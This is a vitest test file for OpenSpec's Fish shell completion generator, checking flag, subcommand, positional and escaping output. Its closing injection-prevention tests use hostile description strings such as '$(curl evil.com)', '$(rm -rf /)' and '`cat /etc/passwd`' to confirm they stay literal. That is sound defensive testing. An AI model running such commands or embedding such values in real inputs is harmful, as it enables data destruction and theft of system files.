import { describe, it, expect, beforeEach } from 'vitest';
import { FishGenerator } from '../../../../src/core/completions/generators/fish-generator.js';
import { CommandDefinition } from '../../../../src/core/completions/types.js';
import { COMMAND_REGISTRY } from '../../../../src/core/completions/command-registry.js';

describe('FishGenerator', () => {
  let generator: FishGenerator;

  beforeEach(() => {
    generator = new FishGenerator();
  });

  function completionLine(script: string, needle: string): string | undefined {
    return script
      .split('\n')
      .find((line) => line.includes('complete -c openspec') && line.includes(needle));
  }

  function completionLines(script: string, needle: string): string[] {
    return script
      .split('\n')
      .filter((line) => line.includes('complete -c openspec') && line.includes(needle));
  }

  describe('interface compliance', () => {
    it('should have shell property set to "fish"', () => {
      expect(generator.shell).toBe('fish');
    });

    it('should implement generate method', () => {
      expect(typeof generator.generate).toBe('function');
    });
  });

  describe('generate', () => {
    it('should generate valid fish completion script with header', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'init',
          description: 'Initialize OpenSpec',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('# Fish completion script for OpenSpec CLI');
      expect(script).toContain('function __fish_openspec');
    });

    it('should generate helper functions for Fish', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'init',
          description: 'Initialize OpenSpec',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('function __fish_openspec_using_subcommand');
      expect(script).toContain('function __fish_openspec_no_subcommand');
      expect(script).toContain('function __fish_openspec_completing_option_value');
      expect(script).toContain('string match -q -- "$option=*" "$current"');
      expect(script).toContain('function __fish_openspec_positional_index');
      expect(script).toContain('if test "$token" = --');
      expect(script).toContain('set options 0');
      expect(script).toContain('test $skip -eq 0; or return 1');
      expect(script).toContain('commandline -opc');
    });

    it('should include all commands with descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'init',
          description: 'Initialize OpenSpec',
          flags: [],
        },
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [],
        },
        {
          name: 'show',
          description: 'Show a spec',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("complete -c openspec");
      expect(script).toContain("-f -a 'init'");
      expect(script).toContain("'Initialize OpenSpec'");
      expect(script).toContain("-a 'validate'");
      expect(script).toContain("'Validate specs'");
      expect(script).toContain("-a 'show'");
      expect(script).toContain("'Show a spec'");
    });

    it('should handle commands with flags without short options', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [
            {
              name: 'strict',
              description: 'Enable strict mode',
            },
            {
              name: 'json',
              description: 'Output as JSON',
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      const strictLine = completionLine(script, '-l strict');
      const jsonLine = completionLine(script, '-l json');

      expect(strictLine).toContain('-f');
      expect(strictLine).toContain("'Enable strict mode'");
      expect(jsonLine).toContain('-f');
      expect(jsonLine).toContain("'Output as JSON'");
    });

    it('should handle flags with short options', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show',
          description: 'Show a spec',
          flags: [
            {
              name: 'requirement',
              short: 'r',
              description: 'Show specific requirement',
              takesValue: true,
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("-s r");
      expect(script).toContain("-l requirement");
      expect(script).toContain("'Show specific requirement'");
      expect(script).toContain("-r -f");
    });

    it('should use -r flag for flags that require values', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [
            {
              name: 'output',
              description: 'Output file',
              takesValue: true,
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("-l output");
      expect(script).toContain("-r -f");
    });

    it('should force file completion for path flags when sibling rules suppress it', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'store',
          description: 'Create and manage stores',
          flags: [],
          subcommands: [
            {
              name: 'setup',
              description: 'Create or register a local store',
              flags: [
                {
                  name: 'path',
                  description: 'Directory to use for the store',
                  takesValue: true,
                  completionType: 'path',
                },
              ],
            },
          ],
        },
      ];

      const script = generator.generate(commands);
      const pathLines = completionLines(script, '-l path');
      const optionLine = pathLines.find((line) => !line.includes('__fish_openspec_completing_option_value'));
      const valueLine = pathLines.find((line) => line.includes('__fish_openspec_completing_option_value'));

      expect(script).toContain(
        "complete -c openspec -n '__fish_openspec_using_subcommand store; and __fish_openspec_using_subcommand setup' -f"
      );
      expect(optionLine).toContain('-r -f');
      expect(valueLine).toContain('__fish_openspec_completing_option_value --path');
      expect(valueLine).toContain('-r -F');
      expect(valueLine).not.toContain(' -f');
    });

    it('should force path completion for every registry-backed path flag', () => {
      const script = generator.generate(COMMAND_REGISTRY);

      for (const flag of ['path', 'code-workspace', 'member']) {
        const lines = completionLines(script, `-l ${flag}`);
        const optionLine = lines.find((line) => !line.includes('__fish_openspec_completing_option_value'));
        const valueLine = lines.find((line) => line.includes('__fish_openspec_completing_option_value'));

        expect(optionLine).toContain('-r -f');
        expect(valueLine).toContain(`__fish_openspec_completing_option_value --${flag}`);
        expect(valueLine).toContain('-r -F');
        expect(valueLine).not.toContain(' -f');
      }
    });

    it('should not use -r flag for boolean flags', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [
            {
              name: 'strict',
              description: 'Enable strict mode',
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      const lines = script.split('\n');
      const strictLine = lines.find(line => line.includes('-l strict'));

      expect(strictLine).toBeDefined();
      expect(strictLine).not.toContain(' -r');
      expect(strictLine).toContain(' -f');
    });

    it('should handle flags with enum values', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [
            {
              name: 'type',
              description: 'Specify item type',
              takesValue: true,
              values: ['change', 'spec'],
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("-l type");
      expect(script).toContain("-r -f -a 'change'");
      expect(script).toContain("-r -f -a 'spec'");
    });

    it('should handle commands with subcommands', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'change',
          description: 'Manage changes',
          flags: [],
          subcommands: [
            {
              name: 'show',
              description: 'Show a change',
              flags: [],
            },
            {
              name: 'list',
              description: 'List changes',
              flags: [],
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("'change'");
      expect(script).toContain("-f -a 'show'");
      expect(script).toContain("-f -a 'list'");
      expect(script).toContain("__fish_openspec_using_subcommand change");
      expect(script).toContain('not __fish_openspec_using_subcommand show list');
    });

    it('should handle positional arguments for change-id', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'archive',
          description: 'Archive a change',
          acceptsPositional: true,
          positionalType: 'change-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);
      const line = completionLine(script, '__fish_openspec_changes');

      expect(line).toContain('-f');
      expect(script).toContain('__fish_openspec_changes');
    });

    it('should handle positional arguments for spec-id', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show-spec',
          description: 'Show a spec',
          acceptsPositional: true,
          positionalType: 'spec-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);
      const line = completionLine(script, '__fish_openspec_specs');

      expect(line).toContain('-f');
      expect(script).toContain('__fish_openspec_specs');
    });

    it('should handle positional arguments for change-or-spec-id', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show',
          description: 'Show an item',
          acceptsPositional: true,
          positionalType: 'change-or-spec-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);
      const line = completionLine(script, '__fish_openspec_items');

      expect(line).toContain('-f');
      expect(script).toContain('__fish_openspec_items');
    });

    it('should handle positional arguments for shell with inline values', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'generate',
          description: 'Generate completions',
          acceptsPositional: true,
          positionalType: 'shell',
          flags: [],
        },
      ];

      const script = generator.generate(commands);
      const line = completionLine(script, "-a 'zsh bash fish powershell'");

      expect(line).toContain('-f');
      expect(script).toContain('zsh');
      expect(script).toContain('bash');
      expect(script).toContain('fish');
      expect(script).toContain('powershell');
    });

    it('should handle positional arguments for schema names', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'schema',
          description: 'Manage schemas',
          acceptsPositional: true,
          positionalType: 'schema-name',
          flags: [],
        },
      ];

      const script = generator.generate(commands);
      const line = completionLine(script, '__fish_openspec_schemas');

      expect(line).toContain('-f');
      expect(script).toContain('__fish_openspec_schemas');
      expect(script).toContain('openspec __complete schemas 2>/dev/null');
    });

    it('should handle indexed positional arguments for schema fork', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'schema',
          description: 'Manage schemas',
          flags: [],
          subcommands: [
            {
              name: 'fork',
              description: 'Copy an existing schema to project for customization',
              acceptsPositional: true,
              positionals: [
                { name: 'source', type: 'schema-name' },
                { name: 'name', optional: true },
              ],
              flags: [],
            },
          ],
        },
      ];

      const script = generator.generate(commands);
      const sourceLine = completionLine(script, '__fish_openspec_positional_index 0 2');
      const nameLine = completionLine(script, '__fish_openspec_positional_index 1 2');

      expect(sourceLine).toContain('__fish_openspec_schemas');
      expect(sourceLine).toContain('-f');
      expect(nameLine).toContain('-f');
      expect(nameLine).not.toContain('__fish_openspec_schemas');
    });

    it('should allow file completion for path-typed indexed positionals', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'workspace',
          description: 'Set up and inspect coordination workspaces',
          flags: [],
          subcommands: [
            {
              name: 'relink',
              description: 'Update the local path for an existing workspace link',
              acceptsPositional: true,
              positionals: [
                { name: 'name' },
                { name: 'path', type: 'path' },
              ],
              flags: [
                {
                  name: 'workspace',
                  description: 'Workspace name from local workspace views',
                  takesValue: true,
                },
              ],
            },
          ],
        },
      ];

      const script = generator.generate(commands);
      const firstLine = completionLine(script, '__fish_openspec_positional_index 0 2 --workspace');
      const secondLine = completionLine(script, '__fish_openspec_positional_index 1 2 --workspace');

      expect(firstLine).toContain('-f');
      expect(secondLine).toContain('__fish_openspec_using_subcommand workspace');
      expect(secondLine).toContain('__fish_openspec_using_subcommand relink');
      expect(secondLine).toContain('__fish_openspec_positional_index 1 2 --workspace');
      // -F, not a bare rule: the sibling subcommand rules below carry -f, and
      // Fish only restores filesystem completion with --force-files.
      expect(secondLine).toContain('-F');
      expect(secondLine).not.toContain(' -f');
    });

    it('should force file completion for a path positional whose siblings suppress files', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'store',
          description: 'Manage stores',
          flags: [],
          subcommands: [
            {
              name: 'register',
              description: 'Register an existing store directory',
              acceptsPositional: true,
              positionals: [{ name: 'path', type: 'path', optional: true }],
              flags: [],
            },
            {
              name: 'list',
              description: 'List registered stores',
              flags: [],
            },
          ],
        },
      ];

      const script = generator.generate(commands);
      const siblingLine = completionLine(script, "-a 'list'");
      const pathLine = completionLine(script, '__fish_openspec_positional_index 0 2');

      // The sibling rule matches while `store register <TAB>` is being completed
      // and suppresses files, so the path rule has to force them back on.
      expect(siblingLine).toContain('-f');
      expect(pathLine).toContain('-F');
    });

    it('should generate dynamic completion helper for changes', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'archive',
          description: 'Archive a change',
          acceptsPositional: true,
          positionalType: 'change-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);
      const line = completionLine(script, '__fish_openspec_changes');

      expect(line).toContain('-f');
      expect(script).toContain('function __fish_openspec_changes');
      expect(script).toContain('openspec __complete changes 2>/dev/null');
      expect(script).toContain('while read -l id desc');
      expect(script).toContain('printf');
    });

    it('should generate dynamic completion helper for specs', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show-spec',
          description: 'Show a spec',
          acceptsPositional: true,
          positionalType: 'spec-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);
      const line = completionLine(script, '__fish_openspec_specs');

      expect(line).toContain('-f');
      expect(script).toContain('function __fish_openspec_specs');
      expect(script).toContain('openspec __complete specs 2>/dev/null');
    });

    it('should generate dynamic completion helper for items', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show',
          description: 'Show an item',
          acceptsPositional: true,
          positionalType: 'change-or-spec-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);
      const line = completionLine(script, '__fish_openspec_items');

      expect(line).toContain('-f');
      expect(script).toContain('function __fish_openspec_items');
      expect(script).toContain('__fish_openspec_changes');
      expect(script).toContain('__fish_openspec_specs');
    });

    it('should escape single quotes in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: "Test with 'quotes'",
          flags: [
            {
              name: 'flag',
              description: "Special chars: 'quotes'",
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("\\'quotes\\'");
    });

    it('should handle complex nested subcommands with flags', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'spec',
          description: 'Manage specs',
          flags: [],
          subcommands: [
            {
              name: 'validate',
              description: 'Validate a spec',
              acceptsPositional: true,
              positionalType: 'spec-id',
              flags: [
                {
                  name: 'strict',
                  description: 'Enable strict mode',
                },
                {
                  name: 'json',
                  description: 'Output as JSON',
                },
              ],
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("'spec'");
      expect(script).toContain("'validate'");
      expect(script).toContain("-l strict");
      expect(script).toContain("-l json");
      expect(script).toContain('__fish_openspec_specs');
    });

    it('should handle empty command list', () => {
      const commands: CommandDefinition[] = [];

      const script = generator.generate(commands);

      expect(script).toContain('# Fish completion script');
      expect(script).toContain('function __fish_openspec');
    });

    it('should handle commands with no flags', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'view',
          description: 'Display dashboard',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("'view'");
      expect(script).toContain("'Display dashboard'");
    });
  });

  describe('security - command injection prevention', () => {
    it('should preserve $() literally in single-quoted descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: 'Test command $(curl evil.com)',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('$(curl evil.com)');
      expect(script).not.toContain('\\$(curl evil.com)');
    });

    it('should preserve backticks literally in single-quoted descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: 'Test command `whoami`',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('`whoami`');
      expect(script).not.toContain('\\`whoami\\`');
    });

    it('should preserve dollar signs literally in single-quoted descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: 'Test with $variable',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('$variable');
      expect(script).not.toContain('\\$variable');
    });

    it('should escape single quotes in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: "Test with 'quotes'",
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      // Should escape single quotes
      expect(script).toContain("\\'");
    });

    it('should escape backslashes in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: 'Test with \\ backslash',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      // Should contain escaped backslashes
      expect(script).toContain('\\\\');
    });

    it('should handle multiple shell metacharacters together', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: "Dangerous: $(rm -rf /) `cat /etc/passwd` $HOME 'quoted'",
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('$(rm -rf /)');
      expect(script).toContain('`cat /etc/passwd`');
      expect(script).toContain('$HOME');
      expect(script).toContain("\\'quoted\\'");
    });
  });
});
